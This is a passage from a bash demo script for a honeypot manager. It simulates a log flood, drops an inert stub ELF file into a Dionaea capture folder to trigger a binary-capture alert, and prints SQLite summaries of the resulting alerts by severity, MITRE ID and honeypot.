    for _ in range(105):
        f.write(line)
print('  105 lines written')
"
echo -e "  ${Y}▸ 105 events → flood alert (T1499) fires. ip_events cleared after detection.${RESET}"
last_alerts 2; countdown $WAIT

# ════════════════════════════════════════════════════════════════
#  SECTION 9 — DIONAEA BINARY CAPTURE  (Phase 50)
# ════════════════════════════════════════════════════════════════

echo -e "\n${M}${W}  ═══ DIONAEA BINARY CAPTURE ═══${RESET}\n"

phase_banner 50 $TOTAL "T1203" "Malware Binary Captured (no VT key)" "honey_dionaea" "medium"
echo "  Writing fake ELF binary to $BINS/"
FNAME="payload_$(date +%s).elf"
python3 - << PYEOF
import struct
# Minimal valid ELF64 header
ident  = b'\x7fELF\x02\x01\x01\x00' + b'\x00'*8
fields = struct.pack('<HHIQQQIHHHHHH', 2, 62, 1, 0, 0, 0, 0, 64, 0, 0, 64, 0, 0)
data   = ident + fields + b'\x00' * 1024
path   = '$BINS/$FNAME'
with open(path, 'wb') as f:
    f.write(data)
print(f'  Written: {path}  ({len(data)} bytes)')
PYEOF
echo -e "  ${Y}▸ Binary watcher polls every 30s → T1203/medium alert in up to ${WAIT_BIN}s${RESET}"
echo -e "  ${DIM}  (If VIRUSTOTAL_API_KEY is set, will attempt VT hash lookup first)${RESET}"
countdown $WAIT_BIN "Binary scan"
last_alerts 2

# ════════════════════════════════════════════════════════════════
#  FINAL SUMMARY
# ════════════════════════════════════════════════════════════════

echo ""
echo -e "${W}╔══════════════════════════════════════════════════════════════╗${RESET}"
echo -e "${W}║                  DEMO COMPLETE — SUMMARY                    ║${RESET}"
echo -e "${W}╚══════════════════════════════════════════════════════════════╝${RESET}"
echo ""
echo -e "  ${Y}Total alerts in DB :${RESET} $(alert_count)"
echo ""
echo -e "  ${Y}By severity:${RESET}"
sqlite3 "$DB" \
  "SELECT '  ' || printf('%-10s',severity) || COUNT(*) || ' alerts' FROM alerts GROUP BY severity ORDER BY CASE severity WHEN 'critical' THEN 1 WHEN 'high' THEN 2 WHEN 'medium' THEN 3 ELSE 4 END;" \
  2>/dev/null || true
echo ""
echo -e "  ${Y}By MITRE ID (top 25):${RESET}"
sqlite3 "$DB" \
  "SELECT '  ' || printf('%-14s', COALESCE(mitre_id,'n/a')) || '  (' || COUNT(*) || 'x)' FROM alerts WHERE mitre_id IS NOT NULL GROUP BY mitre_id ORDER BY COUNT(*) DESC LIMIT 25;" \
  2>/dev/null || true
echo ""
echo -e "  ${Y}By honeypot:${RESET}"
sqlite3 "$DB" \
  "SELECT '  ' || printf('%-25s',honeypot_name) || COUNT(*) FROM alerts GROUP BY honeypot_name ORDER BY COUNT(*) DESC;" \
  2>/dev/null || true
echo ""
echo -e "  ${G}✓ Open the HoneyManager UI to see all alerts with MITRE mapping.${RESET}"
echo -e "  ${G}✓ Check Telegram, all HIGH and CRITICAL alerts were forwarded.${RESET}"
echo ""
